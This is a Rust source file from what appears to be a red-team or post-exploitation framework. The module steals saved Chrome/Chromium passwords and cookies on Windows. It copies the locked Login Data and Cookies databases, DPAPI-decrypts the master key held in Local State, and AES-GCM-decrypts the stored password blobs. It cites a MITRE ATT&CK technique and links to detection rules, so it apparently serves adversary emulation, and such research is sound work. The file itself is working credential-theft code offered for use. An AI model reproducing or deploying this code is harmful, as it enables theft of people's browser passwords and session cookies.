//! Chrome/Chromium credential and cookie extraction
//!
//! ## MITRE ATT&CK
//! - T1555.003: Credentials from Web Browsers
//!
//! ## Detection
//! - wiki/detection/sigma/kraken_browser_*.yml

use super::{BrowserCookie, BrowserCredential};
use common::KrakenError;

#[cfg(windows)]
const CHROME_PATHS: &[&str] = &[
    "Google\\Chrome\\User Data",
    "Chromium\\User Data",
    "Google\\Chrome SxS\\User Data",
];

/// Extract saved passwords from Chrome/Chromium
#[cfg(windows)]
pub fn extract_passwords() -> Result<Vec<BrowserCredential>, KrakenError> {
    let user_data_dir = find_chrome_dir()?;
    let master_key = extract_master_key(&user_data_dir.join("Local State"))?;

    // Copy the Login Data SQLite DB - it is locked while Chrome runs
    let login_db = user_data_dir.join("Default").join("Login Data");
    let temp_path = std::env::temp_dir()
        .join(format!("kr_login_{}.db", std::process::id()));
    std::fs::copy(&login_db, &temp_path)
        .map_err(|e| KrakenError::Module(format!("copy Login Data: {e}")))?;

    let db_bytes = std::fs::read(&temp_path)
        .map_err(|e| KrakenError::Module(format!("read Login Data: {e}")))?;
    let _ = std::fs::remove_file(&temp_path);

    Ok(parse_login_data(&db_bytes, &master_key, "chrome"))
}

/// Extract cookies from Chrome/Chromium
#[cfg(windows)]
pub fn extract_cookies() -> Result<Vec<BrowserCookie>, KrakenError> {
    let user_data_dir = find_chrome_dir()?;
    let master_key = extract_master_key(&user_data_dir.join("Local State"))?;

    // Cookies DB lives at Default/Network/Cookies since Chrome 96+
    let cookies_db = user_data_dir
        .join("Default")
        .join("Network")
        .join("Cookies");
    let temp_path = std::env::temp_dir()
        .join(format!("kr_cookies_{}.db", std::process::id()));
    std::fs::copy(&cookies_db, &temp_path)
        .map_err(|e| KrakenError::Module(format!("copy Cookies: {e}")))?;

    let db_bytes = std::fs::read(&temp_path)
        .map_err(|e| KrakenError::Module(format!("read Cookies: {e}")))?;
    let _ = std::fs::remove_file(&temp_path);

    Ok(parse_cookies(&db_bytes, &master_key, "chrome"))
}

#[cfg(windows)]
fn find_chrome_dir() -> Result<std::path::PathBuf, KrakenError> {
    let local_app_data = std::env::var("LOCALAPPDATA")
        .map_err(|_| KrakenError::Module("LOCALAPPDATA not set".into()))?;

    for path in CHROME_PATHS {
        let full = std::path::PathBuf::from(&local_app_data).join(path);
        if full.exists() {
            return Ok(full);
        }
    }
    Err(KrakenError::Module("Chrome/Chromium not found".into()))
}

/// Read and DPAPI-decrypt the AES master key from Local State JSON
#[cfg(windows)]
pub(crate) fn extract_master_key(
    local_state: &std::path::Path,
) -> Result<Vec<u8>, KrakenError> {
    let contents = std::fs::read_to_string(local_state)
        .map_err(|e| KrakenError::Module(format!("read Local State: {e}")))?;

    let json: serde_json::Value = serde_json::from_str(&contents)
        .map_err(|e| KrakenError::Module(format!("parse Local State: {e}")))?;

    let b64 = json["os_crypt"]["encrypted_key"]
        .as_str()
        .ok_or_else(|| KrakenError::Module("no encrypted_key in Local State".into()))?;

    let encrypted = base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        b64,
    )
    .map_err(|e| KrakenError::Module(format!("base64 decode: {e}")))?;

    // Chrome prepends "DPAPI" (5 bytes) before the DPAPI blob
    if encrypted.len() < 6 || &encrypted[..5] != b"DPAPI" {
        return Err(KrakenError::Module(
            "encrypted_key missing DPAPI prefix".into(),
        ));
    }

    super::decrypt::dpapi_decrypt(&encrypted[5..])
}

/// Heuristic raw-SQLite scan for login entries.
/// A production implementation would embed a proper SQLite reader.
#[cfg(windows)]
fn parse_login_data(
    db_bytes: &[u8],
    master_key: &[u8],
    browser: &str,
) -> Vec<BrowserCredential> {
    let mut out = Vec::new();
    let raw = String::from_utf8_lossy(db_bytes);

    for idx in raw.match_indices("http") {
        let slice = &raw[idx.0..];
        if let Some(end) = slice.find('\0') {
            let url = slice[..end].trim();
            if url.len() > 8 && url.len() < 512 {
                // Try to decrypt the adjacent v10/v11 blob if present
                let password = if let Some(blob_start) = find_v10_blob(db_bytes, idx.0) {
                    match super::decrypt::aes_gcm_decrypt(master_key, blob_start) {
                        Ok(plain) => String::from_utf8_lossy(&plain).into_owned(),
                        Err(_) => "[encrypted]".to_string(),
                    }
                } else {
                    "[encrypted]".to_string()
                };

                out.push(BrowserCredential {
                    browser: browser.to_string(),
                    url: url.to_string(),
                    username: String::new(),
                    password,
                    created: 0,
                    last_used: 0,
                });
            }
        }
    }
    out
}

/// Heuristic raw-SQLite scan for cookie entries.
#[cfg(windows)]
fn parse_cookies(
    db_bytes: &[u8],
    _master_key: &[u8],
    browser: &str,
) -> Vec<BrowserCookie> {
    let mut out = Vec::new();
    let raw = String::from_utf8_lossy(db_bytes);

    // Simple domain heuristic: look for sequences that look like domain names
    for idx in raw.match_indices('.') {
        let start = idx.0.saturating_sub(64);
        let slice = &raw[start..std::cmp::min(raw.len(), idx.0 + 128)];
        // Filter: must contain a TLD-like suffix and be null-terminated nearby
        if slice.contains(".com\0")
            || slice.contains(".net\0")
            || slice.contains(".org\0")
            || slice.contains(".io\0")
        {
            if let Some(domain_end) = raw[idx.0..].find('\0') {
                let domain = raw[idx.0..idx.0 + domain_end].trim_start_matches('.');
                if !domain.is_empty() && domain.len() < 256 {
                    out.push(BrowserCookie {
                        browser: browser.to_string(),
                        domain: domain.to_string(),
                        name: String::new(),
                        value: "[encrypted]".to_string(),
                        expires: 0,
                        secure: false,
                        http_only: false,
                    });
                }
            }
        }
    }
    out.dedup_by(|a, b| a.domain == b.domain);
    out
}

/// Find the next v10/v11 AES-GCM blob after byte offset `after`
#[cfg(windows)]
fn find_v10_blob(bytes: &[u8], after: usize) -> Option<&[u8]> {
    let search = &bytes[after..];
    for i in 0..search.len().saturating_sub(3) {
        if &search[i..i + 3] == b"v10" || &search[i..i + 3] == b"v11" {
            return Some(&search[i..]);
        }
    }
    None
}

// ── Non-Windows stubs ──────────────────────────────────────────────────────

#[cfg(not(windows))]
pub fn extract_passwords() -> Result<Vec<BrowserCredential>, KrakenError> {
    Err(KrakenError::Module(
        "Chrome extraction only supported on Windows".into(),
    ))
}

#[cfg(not(windows))]
pub fn extract_cookies() -> Result<Vec<BrowserCookie>, KrakenError> {
    Err(KrakenError::Module(
        "Chrome extraction only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(not(windows))]
    fn test_chrome_unsupported() {
        assert!(extract_passwords().is_err());
        assert!(extract_cookies().is_err());
    }
}
